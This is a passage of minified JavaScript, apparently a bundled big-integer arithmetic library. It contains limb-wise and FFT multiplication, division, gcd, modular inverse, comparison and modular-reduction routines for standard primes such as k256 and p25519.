                        c = ((o = o + Math.imul(w, ye) | 0) + (i >>> 13) | 0) + (xe >>> 26) | 0, xe &= 67108863, r = Math.imul(z, Z), i = (i = Math.imul(z, J)) + Math.imul(U, Z) | 0, o = Math.imul(U, J), r = r + Math.imul(N, $) | 0, i = (i = i + Math.imul(N, ee) | 0) + Math.imul(R, $) | 0, o = o + Math.imul(R, ee) | 0, r = r + Math.imul(C, ne) | 0, i = (i = i + Math.imul(C, re) | 0) + Math.imul(P, ne) | 0, o = o + Math.imul(P, re) | 0, r = r + Math.imul(B, oe) | 0, i = (i = i + Math.imul(B, se) | 0) + Math.imul(T, oe) | 0, o = o + Math.imul(T, se) | 0, r = r + Math.imul(I, ue) | 0, i = (i = i + Math.imul(I, ce) | 0) + Math.imul(x, ue) | 0, o = o + Math.imul(x, ce) | 0, r = r + Math.imul(_, fe) | 0, i = (i = i + Math.imul(_, he) | 0) + Math.imul(E, fe) | 0, o = o + Math.imul(E, he) | 0;
                        var Me = (c + (r = r + Math.imul(v, pe) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(v, ye) | 0) + Math.imul(A, pe) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(A, ye) | 0) + (i >>> 13) | 0) + (Me >>> 26) | 0, Me &= 67108863, r = Math.imul(z, $), i = (i = Math.imul(z, ee)) + Math.imul(U, $) | 0, o = Math.imul(U, ee), r = r + Math.imul(N, ne) | 0, i = (i = i + Math.imul(N, re) | 0) + Math.imul(R, ne) | 0, o = o + Math.imul(R, re) | 0, r = r + Math.imul(C, oe) | 0, i = (i = i + Math.imul(C, se) | 0) + Math.imul(P, oe) | 0, o = o + Math.imul(P, se) | 0, r = r + Math.imul(B, ue) | 0, i = (i = i + Math.imul(B, ce) | 0) + Math.imul(T, ue) | 0, o = o + Math.imul(T, ce) | 0, r = r + Math.imul(I, fe) | 0, i = (i = i + Math.imul(I, he) | 0) + Math.imul(x, fe) | 0, o = o + Math.imul(x, he) | 0;
                        var Be = (c + (r = r + Math.imul(_, pe) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(_, ye) | 0) + Math.imul(E, pe) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(E, ye) | 0) + (i >>> 13) | 0) + (Be >>> 26) | 0, Be &= 67108863, r = Math.imul(z, ne), i = (i = Math.imul(z, re)) + Math.imul(U, ne) | 0, o = Math.imul(U, re), r = r + Math.imul(N, oe) | 0, i = (i = i + Math.imul(N, se) | 0) + Math.imul(R, oe) | 0, o = o + Math.imul(R, se) | 0, r = r + Math.imul(C, ue) | 0, i = (i = i + Math.imul(C, ce) | 0) + Math.imul(P, ue) | 0, o = o + Math.imul(P, ce) | 0, r = r + Math.imul(B, fe) | 0, i = (i = i + Math.imul(B, he) | 0) + Math.imul(T, fe) | 0, o = o + Math.imul(T, he) | 0;
                        var Te = (c + (r = r + Math.imul(I, pe) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(I, ye) | 0) + Math.imul(x, pe) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(x, ye) | 0) + (i >>> 13) | 0) + (Te >>> 26) | 0, Te &= 67108863, r = Math.imul(z, oe), i = (i = Math.imul(z, se)) + Math.imul(U, oe) | 0, o = Math.imul(U, se), r = r + Math.imul(N, ue) | 0, i = (i = i + Math.imul(N, ce) | 0) + Math.imul(R, ue) | 0, o = o + Math.imul(R, ce) | 0, r = r + Math.imul(C, fe) | 0, i = (i = i + Math.imul(C, he) | 0) + Math.imul(P, fe) | 0, o = o + Math.imul(P, he) | 0;
                        var Oe = (c + (r = r + Math.imul(B, pe) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(B, ye) | 0) + Math.imul(T, pe) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(T, ye) | 0) + (i >>> 13) | 0) + (Oe >>> 26) | 0, Oe &= 67108863, r = Math.imul(z, ue), i = (i = Math.imul(z, ce)) + Math.imul(U, ue) | 0, o = Math.imul(U, ce), r = r + Math.imul(N, fe) | 0, i = (i = i + Math.imul(N, he) | 0) + Math.imul(R, fe) | 0, o = o + Math.imul(R, he) | 0;
                        var Ce = (c + (r = r + Math.imul(C, pe) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(C, ye) | 0) + Math.imul(P, pe) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(P, ye) | 0) + (i >>> 13) | 0) + (Ce >>> 26) | 0, Ce &= 67108863, r = Math.imul(z, fe), i = (i = Math.imul(z, he)) + Math.imul(U, fe) | 0, o = Math.imul(U, he);
                        var Pe = (c + (r = r + Math.imul(N, pe) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(N, ye) | 0) + Math.imul(R, pe) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(R, ye) | 0) + (i >>> 13) | 0) + (Pe >>> 26) | 0, Pe &= 67108863;
                        var Le = (c + (r = Math.imul(z, pe)) | 0) + ((8191 & (i = (i = Math.imul(z, ye)) + Math.imul(U, pe) | 0)) << 13) | 0;
                        return c = ((o = Math.imul(U, ye)) + (i >>> 13) | 0) + (Le >>> 26) | 0, Le &= 67108863, u[0] = ge, u[1] = me, u[2] = we, u[3] = be, u[4] = ve, u[5] = Ae, u[6] = ke, u[7] = _e, u[8] = Ee, u[9] = Se, u[10] = Ie, u[11] = xe, u[12] = Me, u[13] = Be, u[14] = Te, u[15] = Oe, u[16] = Ce, u[17] = Pe, u[18] = Le, 0 !== c && (u[19] = c, n.length++), n
                    };

                    function m(e, t, n) {
                        n.negative = t.negative ^ e.negative, n.length = e.length + t.length;
                        for (var r = 0, i = 0, o = 0; o < n.length - 1; o++) {
                            var s = i;
                            i = 0;
                            for (var a = 67108863 & r, u = Math.min(o, t.length - 1), c = Math.max(0, o - e.length + 1); c <= u; c++) {
                                var l = o - c,
                                    f = (0 | e.words[l]) * (0 | t.words[c]),
                                    h = 67108863 & f;
                                a = 67108863 & (h = h + a | 0), i += (s = (s = s + (f / 67108864 | 0) | 0) + (h >>> 26) | 0) >>> 26, s &= 67108863
                            }
                            n.words[o] = a, r = s, s = i
                        }
                        return 0 !== r ? n.words[o] = r : n.length--, n._strip()
                    }

                    function w(e, t, n) {
                        return m(e, t, n)
                    }

                    function b(e, t) {
                        this.x = e, this.y = t
                    }
                    Math.imul || (g = y), o.prototype.mulTo = function(e, t) {
                        var n = this.length + e.length;
                        return 10 === this.length && 10 === e.length ? g(this, e, t) : n < 63 ? y(this, e, t) : n < 1024 ? m(this, e, t) : w(this, e, t)
                    }, b.prototype.makeRBT = function(e) {
                        for (var t = new Array(e), n = o.prototype._countBits(e) - 1, r = 0; r < e; r++) t[r] = this.revBin(r, n, e);
                        return t
                    }, b.prototype.revBin = function(e, t, n) {
                        if (0 === e || e === n - 1) return e;
                        for (var r = 0, i = 0; i < t; i++) r |= (1 & e) << t - i - 1, e >>= 1;
                        return r
                    }, b.prototype.permute = function(e, t, n, r, i, o) {
                        for (var s = 0; s < o; s++) r[s] = t[e[s]], i[s] = n[e[s]]
                    }, b.prototype.transform = function(e, t, n, r, i, o) {
                        this.permute(o, e, t, n, r, i);
                        for (var s = 1; s < i; s <<= 1)
                            for (var a = s << 1, u = Math.cos(2 * Math.PI / a), c = Math.sin(2 * Math.PI / a), l = 0; l < i; l += a)
                                for (var f = u, h = c, d = 0; d < s; d++) {
                                    var p = n[l + d],
                                        y = r[l + d],
                                        g = n[l + d + s],
                                        m = r[l + d + s],
                                        w = f * g - h * m;
                                    m = f * m + h * g, g = w, n[l + d] = p + g, r[l + d] = y + m, n[l + d + s] = p - g, r[l + d + s] = y - m, d !== a && (w = u * f - c * h, h = u * h + c * f, f = w)
                                }
                    }, b.prototype.guessLen13b = function(e, t) {
                        var n = 1 | Math.max(t, e),
                            r = 1 & n,
                            i = 0;
                        for (n = n / 2 | 0; n; n >>>= 1) i++;
                        return 1 << i + 1 + r
                    }, b.prototype.conjugate = function(e, t, n) {
                        if (!(n <= 1))
                            for (var r = 0; r < n / 2; r++) {
                                var i = e[r];
                                e[r] = e[n - r - 1], e[n - r - 1] = i, i = t[r], t[r] = -t[n - r - 1], t[n - r - 1] = -i
                            }
                    }, b.prototype.normalize13b = function(e, t) {
                        for (var n = 0, r = 0; r < t / 2; r++) {
                            var i = 8192 * Math.round(e[2 * r + 1] / t) + Math.round(e[2 * r] / t) + n;
                            e[r] = 67108863 & i, n = i < 67108864 ? 0 : i / 67108864 | 0
                        }
                        return e
                    }, b.prototype.convert13b = function(e, t, n, i) {
                        for (var o = 0, s = 0; s < t; s++) o += 0 | e[s], n[2 * s] = 8191 & o, o >>>= 13, n[2 * s + 1] = 8191 & o, o >>>= 13;
                        for (s = 2 * t; s < i; ++s) n[s] = 0;
                        r(0 === o), r(0 === (-8192 & o))
                    }, b.prototype.stub = function(e) {
                        for (var t = new Array(e), n = 0; n < e; n++) t[n] = 0;
                        return t
                    }, b.prototype.mulp = function(e, t, n) {
                        var r = 2 * this.guessLen13b(e.length, t.length),
                            i = this.makeRBT(r),
                            o = this.stub(r),
                            s = new Array(r),
                            a = new Array(r),
                            u = new Array(r),
                            c = new Array(r),
                            l = new Array(r),
                            f = new Array(r),
                            h = n.words;
                        h.length = r, this.convert13b(e.words, e.length, s, r), this.convert13b(t.words, t.length, c, r), this.transform(s, o, a, u, r, i), this.transform(c, o, l, f, r, i);
                        for (var d = 0; d < r; d++) {
                            var p = a[d] * l[d] - u[d] * f[d];
                            u[d] = a[d] * f[d] + u[d] * l[d], a[d] = p
                        }
                        return this.conjugate(a, u, r), this.transform(a, u, h, o, r, i), this.conjugate(h, o, r), this.normalize13b(h, r), n.negative = e.negative ^ t.negative, n.length = e.length + t.length, n._strip()
                    }, o.prototype.mul = function(e) {
                        var t = new o(null);
                        return t.words = new Array(this.length + e.length), this.mulTo(e, t)
                    }, o.prototype.mulf = function(e) {
                        var t = new o(null);
                        return t.words = new Array(this.length + e.length), w(this, e, t)
                    }, o.prototype.imul = function(e) {
                        return this.clone().mulTo(e, this)
                    }, o.prototype.imuln = function(e) {
                        var t = e < 0;
                        t && (e = -e), r("number" === typeof e), r(e < 67108864);
                        for (var n = 0, i = 0; i < this.length; i++) {
                            var o = (0 | this.words[i]) * e,
                                s = (67108863 & o) + (67108863 & n);
                            n >>= 26, n += o / 67108864 | 0, n += s >>> 26, this.words[i] = 67108863 & s
                        }
                        return 0 !== n && (this.words[i] = n, this.length++), t ? this.ineg() : this
                    }, o.prototype.muln = function(e) {
                        return this.clone().imuln(e)
                    }, o.prototype.sqr = function() {
                        return this.mul(this)
                    }, o.prototype.isqr = function() {
                        return this.imul(this.clone())
                    }, o.prototype.pow = function(e) {
                        var t = function(e) {
                            for (var t = new Array(e.bitLength()), n = 0; n < t.length; n++) {
                                var r = n / 26 | 0,
                                    i = n % 26;
                                t[n] = e.words[r] >>> i & 1
                            }
                            return t
                        }(e);
                        if (0 === t.length) return new o(1);
                        for (var n = this, r = 0; r < t.length && 0 === t[r]; r++, n = n.sqr());
                        if (++r < t.length)
                            for (var i = n.sqr(); r < t.length; r++, i = i.sqr()) 0 !== t[r] && (n = n.mul(i));
                        return n
                    }, o.prototype.iushln = function(e) {
                        r("number" === typeof e && e >= 0);
                        var t, n = e % 26,
                            i = (e - n) / 26,
                            o = 67108863 >>> 26 - n << 26 - n;
                        if (0 !== n) {
                            var s = 0;
                            for (t = 0; t < this.length; t++) {
                                var a = this.words[t] & o,
                                    u = (0 | this.words[t]) - a << n;
                                this.words[t] = u | s, s = a >>> 26 - n
                            }
                            s && (this.words[t] = s, this.length++)
                        }
                        if (0 !== i) {
                            for (t = this.length - 1; t >= 0; t--) this.words[t + i] = this.words[t];
                            for (t = 0; t < i; t++) this.words[t] = 0;
                            this.length += i
                        }
                        return this._strip()
                    }, o.prototype.ishln = function(e) {
                        return r(0 === this.negative), this.iushln(e)
                    }, o.prototype.iushrn = function(e, t, n) {
                        var i;
                        r("number" === typeof e && e >= 0), i = t ? (t - t % 26) / 26 : 0;
                        var o = e % 26,
                            s = Math.min((e - o) / 26, this.length),
                            a = 67108863 ^ 67108863 >>> o << o,
                            u = n;
                        if (i -= s, i = Math.max(0, i), u) {
                            for (var c = 0; c < s; c++) u.words[c] = this.words[c];
                            u.length = s
                        }
                        if (0 === s);
                        else if (this.length > s)
                            for (this.length -= s, c = 0; c < this.length; c++) this.words[c] = this.words[c + s];
                        else this.words[0] = 0, this.length = 1;
                        var l = 0;
                        for (c = this.length - 1; c >= 0 && (0 !== l || c >= i); c--) {
                            var f = 0 | this.words[c];
                            this.words[c] = l << 26 - o | f >>> o, l = f & a
                        }
                        return u && 0 !== l && (u.words[u.length++] = l), 0 === this.length && (this.words[0] = 0, this.length = 1), this._strip()
                    }, o.prototype.ishrn = function(e, t, n) {
                        return r(0 === this.negative), this.iushrn(e, t, n)
                    }, o.prototype.shln = function(e) {
                        return this.clone().ishln(e)
                    }, o.prototype.ushln = function(e) {
                        return this.clone().iushln(e)
                    }, o.prototype.shrn = function(e) {
                        return this.clone().ishrn(e)
                    }, o.prototype.ushrn = function(e) {
                        return this.clone().iushrn(e)
                    }, o.prototype.testn = function(e) {
                        r("number" === typeof e && e >= 0);
                        var t = e % 26,
                            n = (e - t) / 26,
                            i = 1 << t;
                        return !(this.length <= n) && !!(this.words[n] & i)
                    }, o.prototype.imaskn = function(e) {
                        r("number" === typeof e && e >= 0);
                        var t = e % 26,
                            n = (e - t) / 26;
                        if (r(0 === this.negative, "imaskn works only with positive numbers"), this.length <= n) return this;
                        if (0 !== t && n++, this.length = Math.min(n, this.length), 0 !== t) {
                            var i = 67108863 ^ 67108863 >>> t << t;
                            this.words[this.length - 1] &= i
                        }
                        return this._strip()
                    }, o.prototype.maskn = function(e) {
                        return this.clone().imaskn(e)
                    }, o.prototype.iaddn = function(e) {
                        return r("number" === typeof e), r(e < 67108864), e < 0 ? this.isubn(-e) : 0 !== this.negative ? 1 === this.length && (0 | this.words[0]) <= e ? (this.words[0] = e - (0 | this.words[0]), this.negative = 0, this) : (this.negative = 0, this.isubn(e), this.negative = 1, this) : this._iaddn(e)
                    }, o.prototype._iaddn = function(e) {
                        this.words[0] += e;
                        for (var t = 0; t < this.length && this.words[t] >= 67108864; t++) this.words[t] -= 67108864, t === this.length - 1 ? this.words[t + 1] = 1 : this.words[t + 1]++;
                        return this.length = Math.max(this.length, t + 1), this
                    }, o.prototype.isubn = function(e) {
                        if (r("number" === typeof e), r(e < 67108864), e < 0) return this.iaddn(-e);
                        if (0 !== this.negative) return this.negative = 0, this.iaddn(e), this.negative = 1, this;
                        if (this.words[0] -= e, 1 === this.length && this.words[0] < 0) this.words[0] = -this.words[0], this.negative = 1;
                        else
                            for (var t = 0; t < this.length && this.words[t] < 0; t++) this.words[t] += 67108864, this.words[t + 1] -= 1;
                        return this._strip()
                    }, o.prototype.addn = function(e) {
                        return this.clone().iaddn(e)
                    }, o.prototype.subn = function(e) {
                        return this.clone().isubn(e)
                    }, o.prototype.iabs = function() {
                        return this.negative = 0, this
                    }, o.prototype.abs = function() {
                        return this.clone().iabs()
                    }, o.prototype._ishlnsubmul = function(e, t, n) {
                        var i, o, s = e.length + n;
                        this._expand(s);
                        var a = 0;
                        for (i = 0; i < e.length; i++) {
                            o = (0 | this.words[i + n]) + a;
                            var u = (0 | e.words[i]) * t;
                            a = ((o -= 67108863 & u) >> 26) - (u / 67108864 | 0), this.words[i + n] = 67108863 & o
                        }
                        for (; i < this.length - n; i++) a = (o = (0 | this.words[i + n]) + a) >> 26, this.words[i + n] = 67108863 & o;
                        if (0 === a) return this._strip();
                        for (r(-1 === a), a = 0, i = 0; i < this.length; i++) a = (o = -(0 | this.words[i]) + a) >> 26, this.words[i] = 67108863 & o;
                        return this.negative = 1, this._strip()
                    }, o.prototype._wordDiv = function(e, t) {
                        var n = (this.length, e.length),
                            r = this.clone(),
                            i = e,
                            s = 0 | i.words[i.length - 1];
                        0 !== (n = 26 - this._countBits(s)) && (i = i.ushln(n), r.iushln(n), s = 0 | i.words[i.length - 1]);
                        var a, u = r.length - i.length;
                        if ("mod" !== t) {
                            (a = new o(null)).length = u + 1, a.words = new Array(a.length);
                            for (var c = 0; c < a.length; c++) a.words[c] = 0
                        }
                        var l = r.clone()._ishlnsubmul(i, 1, u);
                        0 === l.negative && (r = l, a && (a.words[u] = 1));
                        for (var f = u - 1; f >= 0; f--) {
                            var h = 67108864 * (0 | r.words[i.length + f]) + (0 | r.words[i.length + f - 1]);
                            for (h = Math.min(h / s | 0, 67108863), r._ishlnsubmul(i, h, f); 0 !== r.negative;) h--, r.negative = 0, r._ishlnsubmul(i, 1, f), r.isZero() || (r.negative ^= 1);
                            a && (a.words[f] = h)
                        }
                        return a && a._strip(), r._strip(), "div" !== t && 0 !== n && r.iushrn(n), {
                            div: a || null,
                            mod: r
                        }
                    }, o.prototype.divmod = function(e, t, n) {
                        return r(!e.isZero()), this.isZero() ? {
                            div: new o(0),
                            mod: new o(0)
                        } : 0 !== this.negative && 0 === e.negative ? (a = this.neg().divmod(e, t), "mod" !== t && (i = a.div.neg()), "div" !== t && (s = a.mod.neg(), n && 0 !== s.negative && s.iadd(e)), {
                            div: i,
                            mod: s
                        }) : 0 === this.negative && 0 !== e.negative ? (a = this.divmod(e.neg(), t), "mod" !== t && (i = a.div.neg()), {
                            div: i,
                            mod: a.mod
                        }) : 0 !== (this.negative & e.negative) ? (a = this.neg().divmod(e.neg(), t), "div" !== t && (s = a.mod.neg(), n && 0 !== s.negative && s.isub(e)), {
                            div: a.div,
                            mod: s
                        }) : e.length > this.length || this.cmp(e) < 0 ? {
                            div: new o(0),
                            mod: this
                        } : 1 === e.length ? "div" === t ? {
                            div: this.divn(e.words[0]),
                            mod: null
                        } : "mod" === t ? {
                            div: null,
                            mod: new o(this.modrn(e.words[0]))
                        } : {
                            div: this.divn(e.words[0]),
                            mod: new o(this.modrn(e.words[0]))
                        } : this._wordDiv(e, t);
                        var i, s, a
                    }, o.prototype.div = function(e) {
                        return this.divmod(e, "div", !1).div
                    }, o.prototype.mod = function(e) {
                        return this.divmod(e, "mod", !1).mod
                    }, o.prototype.umod = function(e) {
                        return this.divmod(e, "mod", !0).mod
                    }, o.prototype.divRound = function(e) {
                        var t = this.divmod(e);
                        if (t.mod.isZero()) return t.div;
                        var n = 0 !== t.div.negative ? t.mod.isub(e) : t.mod,
                            r = e.ushrn(1),
                            i = e.andln(1),
                            o = n.cmp(r);
                        return o < 0 || 1 === i && 0 === o ? t.div : 0 !== t.div.negative ? t.div.isubn(1) : t.div.iaddn(1)
                    }, o.prototype.modrn = function(e) {
                        var t = e < 0;
                        t && (e = -e), r(e <= 67108863);
                        for (var n = (1 << 26) % e, i = 0, o = this.length - 1; o >= 0; o--) i = (n * i + (0 | this.words[o])) % e;
                        return t ? -i : i
                    }, o.prototype.modn = function(e) {
                        return this.modrn(e)
                    }, o.prototype.idivn = function(e) {
                        var t = e < 0;
                        t && (e = -e), r(e <= 67108863);
                        for (var n = 0, i = this.length - 1; i >= 0; i--) {
                            var o = (0 | this.words[i]) + 67108864 * n;
                            this.words[i] = o / e | 0, n = o % e
                        }
                        return this._strip(), t ? this.ineg() : this
                    }, o.prototype.divn = function(e) {
                        return this.clone().idivn(e)
                    }, o.prototype.egcd = function(e) {
                        r(0 === e.negative), r(!e.isZero());
                        var t = this,
                            n = e.clone();
                        t = 0 !== t.negative ? t.umod(e) : t.clone();
                        for (var i = new o(1), s = new o(0), a = new o(0), u = new o(1), c = 0; t.isEven() && n.isEven();) t.iushrn(1), n.iushrn(1), ++c;
                        for (var l = n.clone(), f = t.clone(); !t.isZero();) {
                            for (var h = 0, d = 1; 0 === (t.words[0] & d) && h < 26; ++h, d <<= 1);
                            if (h > 0)
                                for (t.iushrn(h); h-- > 0;)(i.isOdd() || s.isOdd()) && (i.iadd(l), s.isub(f)), i.iushrn(1), s.iushrn(1);
                            for (var p = 0, y = 1; 0 === (n.words[0] & y) && p < 26; ++p, y <<= 1);
                            if (p > 0)
                                for (n.iushrn(p); p-- > 0;)(a.isOdd() || u.isOdd()) && (a.iadd(l), u.isub(f)), a.iushrn(1), u.iushrn(1);
                            t.cmp(n) >= 0 ? (t.isub(n), i.isub(a), s.isub(u)) : (n.isub(t), a.isub(i), u.isub(s))
                        }
                        return {
                            a: a,
                            b: u,
                            gcd: n.iushln(c)
                        }
                    }, o.prototype._invmp = function(e) {
                        r(0 === e.negative), r(!e.isZero());
                        var t = this,
                            n = e.clone();
                        t = 0 !== t.negative ? t.umod(e) : t.clone();
                        for (var i, s = new o(1), a = new o(0), u = n.clone(); t.cmpn(1) > 0 && n.cmpn(1) > 0;) {
                            for (var c = 0, l = 1; 0 === (t.words[0] & l) && c < 26; ++c, l <<= 1);
                            if (c > 0)
                                for (t.iushrn(c); c-- > 0;) s.isOdd() && s.iadd(u), s.iushrn(1);
                            for (var f = 0, h = 1; 0 === (n.words[0] & h) && f < 26; ++f, h <<= 1);
                            if (f > 0)
                                for (n.iushrn(f); f-- > 0;) a.isOdd() && a.iadd(u), a.iushrn(1);
                            t.cmp(n) >= 0 ? (t.isub(n), s.isub(a)) : (n.isub(t), a.isub(s))
                        }
                        return (i = 0 === t.cmpn(1) ? s : a).cmpn(0) < 0 && i.iadd(e), i
                    }, o.prototype.gcd = function(e) {
                        if (this.isZero()) return e.abs();
                        if (e.isZero()) return this.abs();
                        var t = this.clone(),
                            n = e.clone();
                        t.negative = 0, n.negative = 0;
                        for (var r = 0; t.isEven() && n.isEven(); r++) t.iushrn(1), n.iushrn(1);
                        for (;;) {
                            for (; t.isEven();) t.iushrn(1);
                            for (; n.isEven();) n.iushrn(1);
                            var i = t.cmp(n);
                            if (i < 0) {
                                var o = t;
                                t = n, n = o
                            } else if (0 === i || 0 === n.cmpn(1)) break;
                            t.isub(n)
                        }
                        return n.iushln(r)
                    }, o.prototype.invm = function(e) {
                        return this.egcd(e).a.umod(e)
                    }, o.prototype.isEven = function() {
                        return 0 === (1 & this.words[0])
                    }, o.prototype.isOdd = function() {
                        return 1 === (1 & this.words[0])
                    }, o.prototype.andln = function(e) {
                        return this.words[0] & e
                    }, o.prototype.bincn = function(e) {
                        r("number" === typeof e);
                        var t = e % 26,
                            n = (e - t) / 26,
                            i = 1 << t;
                        if (this.length <= n) return this._expand(n + 1), this.words[n] |= i, this;
                        for (var o = i, s = n; 0 !== o && s < this.length; s++) {
                            var a = 0 | this.words[s];
                            o = (a += o) >>> 26, a &= 67108863, this.words[s] = a
                        }
                        return 0 !== o && (this.words[s] = o, this.length++), this
                    }, o.prototype.isZero = function() {
                        return 1 === this.length && 0 === this.words[0]
                    }, o.prototype.cmpn = function(e) {
                        var t, n = e < 0;
                        if (0 !== this.negative && !n) return -1;
                        if (0 === this.negative && n) return 1;
                        if (this._strip(), this.length > 1) t = 1;
                        else {
                            n && (e = -e), r(e <= 67108863, "Number is too big");
                            var i = 0 | this.words[0];
                            t = i === e ? 0 : i < e ? -1 : 1
                        }
                        return 0 !== this.negative ? 0 | -t : t
                    }, o.prototype.cmp = function(e) {
                        if (0 !== this.negative && 0 === e.negative) return -1;
                        if (0 === this.negative && 0 !== e.negative) return 1;
                        var t = this.ucmp(e);
                        return 0 !== this.negative ? 0 | -t : t
                    }, o.prototype.ucmp = function(e) {
                        if (this.length > e.length) return 1;
                        if (this.length < e.length) return -1;
                        for (var t = 0, n = this.length - 1; n >= 0; n--) {
                            var r = 0 | this.words[n],
                                i = 0 | e.words[n];
                            if (r !== i) {
                                r < i ? t = -1 : r > i && (t = 1);
                                break
                            }
                        }
                        return t
                    }, o.prototype.gtn = function(e) {
                        return 1 === this.cmpn(e)
                    }, o.prototype.gt = function(e) {
                        return 1 === this.cmp(e)
                    }, o.prototype.gten = function(e) {
                        return this.cmpn(e) >= 0
                    }, o.prototype.gte = function(e) {
                        return this.cmp(e) >= 0
                    }, o.prototype.ltn = function(e) {
                        return -1 === this.cmpn(e)
                    }, o.prototype.lt = function(e) {
                        return -1 === this.cmp(e)
                    }, o.prototype.lten = function(e) {
                        return this.cmpn(e) <= 0
                    }, o.prototype.lte = function(e) {
                        return this.cmp(e) <= 0
                    }, o.prototype.eqn = function(e) {
                        return 0 === this.cmpn(e)
                    }, o.prototype.eq = function(e) {
                        return 0 === this.cmp(e)
                    }, o.red = function(e) {
                        return new I(e)
                    }, o.prototype.toRed = function(e) {
                        return r(!this.red, "Already a number in reduction context"), r(0 === this.negative, "red works only with positives"), e.convertTo(this)._forceRed(e)
                    }, o.prototype.fromRed = function() {
                        return r(this.red, "fromRed works only with numbers in reduction context"), this.red.convertFrom(this)
                    }, o.prototype._forceRed = function(e) {
                        return this.red = e, this
                    }, o.prototype.forceRed = function(e) {
                        return r(!this.red, "Already a number in reduction context"), this._forceRed(e)
                    }, o.prototype.redAdd = function(e) {
                        return r(this.red, "redAdd works only with red numbers"), this.red.add(this, e)
                    }, o.prototype.redIAdd = function(e) {
                        return r(this.red, "redIAdd works only with red numbers"), this.red.iadd(this, e)
                    }, o.prototype.redSub = function(e) {
                        return r(this.red, "redSub works only with red numbers"), this.red.sub(this, e)
                    }, o.prototype.redISub = function(e) {
                        return r(this.red, "redISub works only with red numbers"), this.red.isub(this, e)
                    }, o.prototype.redShl = function(e) {
                        return r(this.red, "redShl works only with red numbers"), this.red.shl(this, e)
                    }, o.prototype.redMul = function(e) {
                        return r(this.red, "redMul works only with red numbers"), this.red._verify2(this, e), this.red.mul(this, e)
                    }, o.prototype.redIMul = function(e) {
                        return r(this.red, "redMul works only with red numbers"), this.red._verify2(this, e), this.red.imul(this, e)
                    }, o.prototype.redSqr = function() {
                        return r(this.red, "redSqr works only with red numbers"), this.red._verify1(this), this.red.sqr(this)
                    }, o.prototype.redISqr = function() {
                        return r(this.red, "redISqr works only with red numbers"), this.red._verify1(this), this.red.isqr(this)
                    }, o.prototype.redSqrt = function() {
                        return r(this.red, "redSqrt works only with red numbers"), this.red._verify1(this), this.red.sqrt(this)
                    }, o.prototype.redInvm = function() {
                        return r(this.red, "redInvm works only with red numbers"), this.red._verify1(this), this.red.invm(this)
                    }, o.prototype.redNeg = function() {
                        return r(this.red, "redNeg works only with red numbers"), this.red._verify1(this), this.red.neg(this)
                    }, o.prototype.redPow = function(e) {
                        return r(this.red && !e.red, "redPow(normalNum)"), this.red._verify1(this), this.red.pow(this, e)
                    };
                    var v = {
                        k256: null,
                        p224: null,
                        p192: null,
                        p25519: null
                    };

                    function A(e, t) {
                        this.name = e, this.p = new o(t, 16), this.n = this.p.bitLength(), this.k = new o(1).iushln(this.n).isub(this.p), this.tmp = this._tmp()
                    }

                    function k() {
                        A.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")
                    }

                    function _() {
                        A.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")
                    }

                    function E() {
                        A.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")
                    }

                    function S() {
                        A.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")
                    }

                    function I(e) {
                        if ("string" === typeof e) {
                            var t = o._prime(e);
                            this.m = t.p, this.prime = t
                        } else r(e.gtn(1), "modulus must be greater than 1"), this.m = e, this.prime = null
                    }

                    function x(e) {
                        I.call(this, e), this.shift = this.m.bitLength(), this.shift % 26 !== 0 && (this.shift += 26 - this.shift % 26), this.r = new o(1).iushln(this.shift), this.r2 = this.imod(this.r.sqr()), this.rinv = this.r._invmp(this.m), this.minv = this.rinv.mul(this.r).isubn(1).div(this.m), this.minv = this.minv.umod(this.r), this.minv = this.r.sub(this.minv)
                    }
                    A.prototype._tmp = function() {
                        var e = new o(null);
                        return e.words = new Array(Math.ceil(this.n / 13)), e
                    }, A.prototype.ireduce = function(e) {
                        var t, n = e;
                        do {
                            this.split(n, this.tmp), t = (n = (n = this.imulK(n)).iadd(this.tmp)).bitLength()
                        } while (t > this.n);
                        var r = t < this.n ? -1 : n.ucmp(this.p);
                        return 0 === r ? (n.words[0] = 0, n.length = 1) : r > 0 ? n.isub(this.p) : void 0 !== n.strip ? n.strip() : n._strip(), n
                    }, A.prototype.split = function(e, t) {
                        e.iushrn(this.n, 0, t)
                    }, A.prototype.imulK = function(e) {
                        return e.imul(this.k)
                    }, i(k, A), k.prototype.split = function(e, t) {
                        for (var n = 4194303, r = Math.min(e.length, 9), i = 0; i < r; i++) t.words[i] = e.words[i];
                        if (t.length = r, e.length <= 9) return e.words[0] = 0, void(e.length = 1);
                        var o = e.words[9];
                        for (t.words[t.length++] = o & n, i = 10; i < e.length; i++) {
                            var s = 0 | e.words[i];
                            e.words[i - 10] = (s & n) << 4 | o >>> 22, o = s
                        }
                        o >>>= 22, e.words[i - 10] = o, 0 === o && e.length > 10 ? e.length -= 10 : e.length -= 9
                    }, k.prototype.imulK = function(e) {
                        e.words[e.length] = 0, e.words[e.length + 1] = 0, e.length += 2;
                        for (var t = 0, n = 0; n < e.length; n++) {
                            var r = 0 | e.words[n];
                            t += 977 * r, e.words[n] = 67108863 & t, t = 64 * r + (t / 67108864 | 0)
                        }
                        return 0 === e.words[e.length - 1] && (e.length--, 0 === e.words[e.length - 1] && e.length--), e
                    }, i(_, A), i(E, A), i(S, A), S.prototype.imulK = function(e) {
                        for (var t = 0, n = 0; n < e.length; n++) {
                            var r = 19 * (0 | e.words[n]) + t,
                                i = 67108863 & r;
                            r >>>= 26, e.words[n] = i, t = r
                        }
                        return 0 !== t && (e.words[e.length++] = t), e
                    }, o._prime = function(e) {
                        if (v[e]) return v[e];
                        var t;
                        if ("k256" === e) t = new k;
                        else if ("p224" === e) t = new _;
                        else if ("p192" === e) t = new E;
                        else {
